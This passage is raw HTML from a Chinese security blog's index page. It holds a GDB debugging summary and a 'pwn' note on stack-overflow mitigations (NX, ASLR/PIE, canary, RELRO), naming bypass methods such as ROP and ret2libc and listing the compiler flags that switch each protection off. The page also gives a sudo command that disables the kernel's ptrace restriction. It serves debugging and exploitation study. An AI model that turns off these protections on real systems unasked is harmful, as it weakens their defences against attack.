value.</span><br><span class="line"></span><br><span class="line">The simplest use of output formats is to say how to print a value already computed. This is done by starting the arguments of the print command with a slash and a format letter. The format letters supported are:</span><br><span class="line"></span><br><span class="line">x</span><br><span class="line">Regard the bits of the value as an integer, and print the integer in hexadecimal.</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line">Print as integer in signed decimal.</span><br><span class="line"></span><br><span class="line">u</span><br><span class="line">Print as integer in unsigned decimal.</span><br><span class="line"></span><br><span class="line">o</span><br><span class="line">Print as integer in octal.</span><br><span class="line"></span><br><span class="line">t</span><br><span class="line">Print as integer in binary. The letter ‘t’ stands for “two”. 11</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">Print as an address, both absolute in hexadecimal and as an offset from the nearest preceding symbol. You can use this format used to discover where (in what function) an unknown address is located:</span><br><span class="line"></span><br><span class="line">(gdb) p/a 0x54320</span><br><span class="line">$3 = 0x54320 <span class="xml">&lt;_initialize_vx+396&gt;</span></span><br><span class="line">The command info symbol 0x54320 yields similar results. See info symbol.</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line">Regard as an integer and print it as a character constant. This prints both the numerical value and its character representation. The character representation is replaced with the octal escape ‘\nnn’ for characters outside the 7-bit ASCII range.</span><br><span class="line"></span><br><span class="line">Without this format, GDB displays char, unsigned char, and signed char data as character constants. Single-byte members of vectors are displayed as integer data.</span><br><span class="line"></span><br><span class="line">f</span><br><span class="line">Regard the bits of the value as a floating point number and print using typical floating point syntax.</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">Regard as a string, if possible. With this format, pointers to single-byte data are displayed as null-terminated strings and arrays of single-byte data are displayed as fixed-length strings. Other values are displayed in their natural types.</span><br><span class="line"></span><br><span class="line">Without this format, GDB displays pointers to and arrays of char, unsigned char, and signed char as strings. Single-byte members of a vector are displayed as an integer array.</span><br><span class="line"></span><br><span class="line">z</span><br><span class="line">Like ‘x’ formatting, the value is treated as an integer and printed as hexadecimal, but leading zeros are printed to pad the value to the size of the integer type.</span><br><span class="line"></span><br><span class="line">r</span><br><span class="line">Print using the ‘raw’ formatting. By default, GDB will use a Python-based pretty-printer, if one is available (see Pretty Printing). This typically results in a higher-level display of the value’s contents. The ‘r’ format bypasses any Python pretty-printer which might exist.</span><br><span class="line"></span><br><span class="line">For example, to print the program counter in hex (see Registers), type</span><br><span class="line"></span><br><span class="line">p/x $pc</span><br><span class="line">Note that no space is required before the slash; this is because command names in GDB cannot contain a slash.</span><br><span class="line"></span><br><span class="line">To reprint the last value in the value history with a different format, you can use the print command with just a format and no expression. For example, ‘p/x’ reprints the last value in hex.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://sourceware.org/gdb/onlinedocs/gdb/Output-Formats.html">FMT</a></p>
<h3 id="检查寄存器"><a href="#检查寄存器" class="headerlink" title="检查寄存器"></a>检查寄存器</h3><p>info r rax rbx rbp</p>
<p>也可以使用print(short form:p)结合/FMT，进行格式化输出</p>
<h3 id="修改寄存器"><a href="#修改寄存器" class="headerlink" title="修改寄存器"></a>修改寄存器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set $rax = 0xdeadbeeff00dface</span><br><span class="line">(gdb) p/x $rax</span><br><span class="line"><span class="meta">$</span><span class="bash">15 = 0xdeadbeeff00dface</span></span><br><span class="line">(gdb) set $ax = 0xcafef00d</span><br><span class="line">(gdb) p/x $rax</span><br><span class="line"><span class="meta">$</span><span class="bash">16 = 0xdeadbeeff00df00d</span></span><br></pre></td></tr></table></figure>

<h3 id="检查内存"><a href="#检查内存" class="headerlink" title="检查内存"></a>检查内存</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">The <span class="string">&quot;x&quot;</span> <span class="built_in">command</span> (<span class="keyword">for</span> examine memory) supports the /FMT specifier.</span></span><br><span class="line">(gdb) x/8xb $rsp</span><br><span class="line">0x7fffffffe038: 0xb3 0xd0 0xde 0xf7 0xff 0x7f 0x00 0x00</span><br><span class="line">(gdb) x/4xh $rsp</span><br><span class="line">0x7fffffffe038: 0xd0b3 0xf7de 0x7fff 0x0000</span><br><span class="line">(gdb) x/2xw $rsp</span><br><span class="line">0x7fffffffe038: 0xf7ded0b3 0x00007fff</span><br><span class="line">(gdb) x/1xg $rsp</span><br><span class="line">0x7fffffffe038: 0x00007ffff7ded0b3</span><br><span class="line">(gdb) x/s 0x555555556008</span><br><span class="line">0x555555556008: &quot;First %d elements of the Fibbonacci sequence: &quot;</span><br><span class="line">(gdb) x/3i $rip</span><br><span class="line">=&gt; 0x5555555551a9 &lt;main&gt;: endbr64 </span><br><span class="line">   0x5555555551ad &lt;main+4&gt;: push   %rbp</span><br><span class="line">   0x5555555551ae &lt;main+5&gt;: mov    %rsp,%rbp</span><br></pre></td></tr></table></figure>

<h3 id="修改内存"><a href="#修改内存" class="headerlink" title="修改内存"></a>修改内存</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> (gdb) x/1xg $rsp</span><br><span class="line">0x7fffffffe038: 0x00007ffff7ded0b3</span><br><span class="line">(gdb) set &#123;char&#125;$rsp = 0xFF</span><br><span class="line">(gdb) x/1xg $rsp</span><br><span class="line">0x7fffffffe038: 0x00007ffff7ded0ff</span><br><span class="line">(gdb) set &#123;short&#125;$rsp = 0xFF</span><br><span class="line">(gdb) x/1xg $rsp</span><br><span class="line">0x7fffffffe038: 0x00007ffff7de00ff</span><br><span class="line">(gdb) set &#123;short&#125;$rsp = 0xFFFF</span><br><span class="line">(gdb) x/1xg $rsp</span><br><span class="line">0x7fffffffe038: 0x00007ffff7deffff</span><br><span class="line">(gdb) set &#123;long long&#125;$rsp = 0x1337bee7</span><br><span class="line">(gdb) x/1xg $rsp</span><br><span class="line">0x7fffffffe038: 0x000000001337bee7</span><br></pre></td></tr></table></figure>

<h3 id="栈回溯"><a href="#栈回溯" class="headerlink" title="栈回溯"></a>栈回溯</h3><p><a target="_blank" rel="noopener" href="https://sourceware.org/gdb/current/onlinedocs/gdb/Backtrace.html#Backtrace">bt</a></p>
<h2 id="五、单步运行"><a href="#五、单步运行" class="headerlink" title="五、单步运行"></a>五、单步运行</h2><p>单步步过：ni<br>单步步入：si<br>单步步出：finish(short form:fin)</p>
<p>运行到某个地址：until &lt;address&gt;</p>
<h2 id="六、附加运行"><a href="#六、附加运行" class="headerlink" title="六、附加运行"></a>六、附加运行</h2><p>依赖于你的系统安全设置支不支持ptrace的系统调用，你也许不能附加到进程上，尽管你们使用的是相同的用户。你也可以使用root权限运行gdb，或者使用下述命令去禁用掉这个安全选项。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure>

<p>Remembering to re-restrict access when done via:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 | sudo tee /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure>

<p>attach &lt;process ID&gt;</p>
<h2 id="七、杂项配置"><a href="#七、杂项配置" class="headerlink" title="七、杂项配置"></a>七、杂项配置</h2><p>可以在gdb中使用下述命令修改gdb的汇编语言的类型到Intel或者AT&amp;T：</p>
<p>set disassembly-flavor intel<br>set disassembly-flavor att</p>
<h2 id="八、gdb的命令行文件"><a href="#八、gdb的命令行文件" class="headerlink" title="八、gdb的命令行文件"></a>八、gdb的命令行文件</h2><p>有时候想要让他在启动gdb时就自动运行一些命令，可以使用脚本，gdb启动时加上 -x 指定脚本文件 就可以了。</p>

	
	</div>
  <a type="button" href="/2021/08/03/gdb使用总结/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/01/pwn总结/" >pwn总结</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-01  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
		
            
            <p class="post">&lt;h2 id=&#34;栈溢出&#34;&gt;&lt;a href=&#34;#栈溢出&#34; class=&#34;headerlink&#34; title=&#34;栈溢出&#34;&gt;&lt;/a&gt;栈溢出&lt;/h2&gt;&lt;h3 id=&#34;过NX&#34;&gt;&lt;a href=&#34;#过NX&#34; class=&#34;headerlink&#34; title=&#34;过NX&#34;&gt;&lt;/a&gt;过NX&lt;/h3&gt;&lt;p&gt;No-eXecute，表示不可执行，其原理是将数据所在的内存页标识为不可执行，如果程序产生溢出转入执行 shellcode 时，CPU 会抛出异常。&lt;/p&gt;
&lt;p&gt;在 Linux 中，当装载器将程序装载进内存空间后，将程序的 .text 段标记为可执行，而其余的数据段（.data、.bss 等）以及栈、堆均为不可执行。因此，传统利用方式中通过修改 GOT 来执行 shellcode 的方式不再可行。&lt;/p&gt;
&lt;p&gt;使用ROP，ret2libc&lt;/p&gt;
&lt;h3 id=&#34;过PIE，ASLR&#34;&gt;&lt;a href=&#34;#过PIE，ASLR&#34; class=&#34;headerlink&#34; title=&#34;过PIE，ASLR&#34;&gt;&lt;/a&gt;过PIE，ASLR&lt;/h3&gt;&lt;p&gt;地址空间布局随机化（ASLR），该技术虽然不是由 GCC 编译时提供的，但对 PIE 还是有影响。该技术旨在将程序的内存布局随机化，使得攻击者不能轻易地得到数据区的地址来构造 payload。由于程序的堆栈分配与共享库的装载都是在运行时进行，系统在程序每次执行时，随机地分配程序堆栈的地址以及共享库装载的地址。使得攻击者无法预测自己写入的数据区的虚拟地址。&lt;/p&gt;
&lt;p&gt;针对该保护机制的攻击，往往是通过信息泄漏来实现。由于同一模块中的所有代码和数据的相对偏移是固定的，攻击者只要泄漏出某个模块中的任一代码指针或数据指针，即可通过计算得到此模块中任意代码或数据的地址。&lt;/p&gt;
&lt;p&gt;PIE（Position Independent Executable）其实就是把可执行文件给编译成动态链接库，需要配合 ASLR 来使用，以达到可执行文件的加载时地址随机化。简单来说，PIE 是编译时随机化，由编译器完成；ASLR 是加载时随机化，由操作系统完成。ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 在编译时将程序编译为位置无关、即程序运行时各个段加载的虚拟地址在装载时确定。开启 PIE 时，编译生成的是动态库文件（Shared object）文件，而关闭 PIE 后生成可执行文件（Executable）&lt;/p&gt;
&lt;p&gt;需要把地址泄漏出来&lt;/p&gt;
&lt;h3 id=&#34;过canary&#34;&gt;&lt;a href=&#34;#过canary&#34; class=&#34;headerlink&#34; title=&#34;过canary&#34;&gt;&lt;/a&gt;过canary&lt;/h3&gt;&lt;p&gt;-fno-stack-protector 关闭canary检测&lt;br&gt;-fstack-protector 打开canary检测&lt;/p&gt;
&lt;p&gt;通过泄漏地址或者&lt;/p&gt;
&lt;h3 id=&#34;RELRO&#34;&gt;&lt;a href=&#34;#RELRO&#34; class=&#34;headerlink&#34; title=&#34;RELRO&#34;&gt;&lt;/a&gt;RELRO&lt;/h3&gt;&lt;p&gt;RELRO（ReLocation Read-Only）设置符号重定向表为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）的攻击。&lt;/p&gt;
&lt;p&gt;RELOR 有两种形式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Partial RELRO：一些段（包括 &lt;code&gt;.dynamic&lt;/code&gt;）在初始化后将会被标记为只读。&lt;/li&gt;
&lt;li&gt;Full RELRO：除了 Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，&lt;code&gt;.got.plt&lt;/code&gt; 段会被完全初始化为目标函数的最终地址，并被标记为只读。另外 &lt;code&gt;link_map&lt;/code&gt; 和 &lt;code&gt;_dl_runtime_resolve&lt;/code&gt; 的地址也不会被装入。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;编译参数&#34;&gt;&lt;a href=&#34;#编译参数&#34; class=&#34;headerlink&#34; title=&#34;编译参数&#34;&gt;&lt;/a&gt;编译参数&lt;/h2&gt;&lt;p&gt;各种安全技术的编译参数如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;安全技术&lt;/th&gt;
&lt;th&gt;完全开启&lt;/th&gt;
&lt;th&gt;部分开启&lt;/th&gt;
&lt;th&gt;关闭&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Canary&lt;/td&gt;
&lt;td&gt;-fstack-protector-all&lt;/td&gt;
&lt;td&gt;-fstack-protector&lt;/td&gt;
&lt;td&gt;-fno-stack-protector&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NX&lt;/td&gt;
&lt;td&gt;-z noexecstack&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;-z execstack&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PIE&lt;/td&gt;
&lt;td&gt;-pie&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;-no-pie&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RELRO&lt;/td&gt;
&lt;td&gt;-z now&lt;/td&gt;
&lt;td&gt;-z lazy&lt;/td&gt;
&lt;td&gt;-z norelro&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
<p>
		

	

	</div>
  <a type="button" href="/2021/08/01/pwn总结/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="过NX"><a href="#过NX" class="headerlink" title="过NX"></a>过NX</h3><p>No-eXecute，表示不可执行，其原理是将数据所在的内存页标识为不可执行，如果程序产生溢出转入执行 shellcode 时，CPU 会抛出异常。</p>
<p>在 Linux 中，当装载器将程序装载进内存空间后，将程序的 .text 段标记为可执行，而其余的数据段（.data、.bss 等）以及栈、堆均为不可执行。因此，传统利用方式中通过修改 GOT 来执行 shellcode 的方式不再可行。</p>
<p>使用ROP，ret2libc</p>
<h3 id="过PIE，ASLR"><a href="#过PIE，ASLR" class="headerlink" title="过PIE，ASLR"></a>过PIE，ASLR</h3><p>地址空间布局随机化（ASLR），该技术虽然不是由 GCC 编译时提供的，但对 PIE 还是有影响。该技术旨在将程序的内存布局随机化，使得攻击者不能轻易地得到数据区的地址来构造 payload。由于程序的堆栈分配与共享库的装载都是在运行时进行，系统在程序每次执行时，随机地分配程序堆栈的地址以及共享库装载的地址。使得攻击者无法预测自己写入的数据区的虚拟地址。</p>
<p>针对该保护机制的攻击，往往是通过信息泄漏来实现。由于同一模块中的所有代码和数据的相对偏移是固定的，攻击者只要泄漏出某个模块中的任一代码指针或数据指针，即可通过计算得到此模块中任意代码或数据的地址。</p>
<p>PIE（Position Independent Executable）其实就是把可执行文件给编译成动态链接库，需要配合 ASLR 来使用，以达到可执行文件的加载时地址随机化。简单来说，PIE 是编译时随机化，由编译器完成；ASLR 是加载时随机化，由操作系统完成。ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 在编译时将程序编译为位置无关、即程序运行时各个段加载的虚拟地址在装载时确定。开启 PIE 时，编译生成的是动态库文件（Shared object）文件，而关闭 PIE 后生成可执行文件（Executable）</p>
<p>需要把地址泄漏出来</p>
<h3 id="过canary"><a href="#过canary" class="headerlink" title="过canary"></a>过canary</h3><p>-fno-stack-protector 关闭canary检测<br>-fstack-protector 打开canary检测</p>
<p>通过泄漏地址或者</p>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO（ReLocation Read-Only）设置符号重定向表为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）的攻击。</p>
<p>RELOR 有两种形式：</p>
<ul>
<li>Partial RELRO：一些段（包括 <code>.dynamic</code>）在初始化后将会被标记为只读。</li>
<li>Full RELRO：除了 Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，<code>.got.plt</code> 段会被完全初始化为目标函数的最终地址，并被标记为只读。另外 <code>link_map</code> 和 <code>_dl_runtime_resolve</code> 的地址也不会被装入。</li>
</ul>
<h2 id="编译参数"><a href="#编译参数" class="headerlink" title="编译参数"></a>编译参数</h2><p>各种安全技术的编译参数如下：</p>
<table>
<thead>
<tr>
<th>安全技术</th>
<th>完全开启</th>
<th>部分开启</th>
<th>关闭</th>
</tr>
</thead>
<tbody><tr>
<td>Canary</td>
<td>-fstack-protector-all</td>
<td>-fstack-protector</td>
<td>-fno-stack-protector</td>
</tr>
<tr>
<td>NX</td>
<td>-z noexecstack</td>
<td></td>
<td>-z execstack</td>
</tr>
<tr>
<td>PIE</td>
<td>-pie</td>
<td></td>
<td>-no-pie</td>
</tr>
<tr>
<td>RELRO</td>
<td>-z now</td>
<td>-z lazy</td>
<td>-z norelro</td>
</tr>
</tbody></table>

	
	</div>
  <a type="button" href="/2021/08/01/pwn总结/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/软件调试/">软件调试<span>1</span></a></li>
		
			<li><a href="/tags/CPU/">CPU<span>3</span></a></li>
		
			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
		
			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
		
			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
		
			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
		
			<li><a href="/tags/算法与数据结构/">算法与数据结构<span>3</span></a></li>
		
			<li><a href="/tags/Android/">Android<span>1</span></a></li>
		
			<li><a href="/tags/unix/">unix<span>2</span></a></li>
		
			<li><a href="/tags/正则表达式/">正则表达式<span>1</span></a></li>
		
			<li><a href="/tags/漏洞分析/">漏洞分析<span>6</span></a></li>
		
			<li><a href="/tags/windows内核/">windows内核<span>4</span></a></li>
		
			<li><a href="/tags/漏洞研究/">漏洞研究<span>1</span></a></li>
		
			<li><a href="/tags/python/">python<span>2</span></a></li>
		
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2021/09/09/遇到hexo莫名其妙的bug/" ><i class="fa fa-file-o"></i>遇到hexo莫名其妙的bug</a>
      </li>
    
      <li>
        <a href="/2021/09/07/CVE-2021-3156分析/" ><i class="fa fa-file-o"></i>2021-08-04-CVE-2021-3156分析</a>
      </li>
    
      <li>
        <a href="/2021/09/02/高级IO/" ><i class="fa fa-file-o"></i>高级I/O</a>
      </li>
    
      <li>
        <a href="/2021/08/30/守护进程/" ><i class="fa fa-file-o"></i>Unix守护进程</a>
      </li>
    
      <li>
        <a href="/2021/08/20/Android-Java类加载机制/" ><i class="fa fa-file-o"></i>Java类加载机制</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="fa fa-github"></i><a href="http://www.github.com/p1ain0" title="My Github account." target="_blank"]);">My Github</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2021 P1AIN0&#39;S BLOG
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
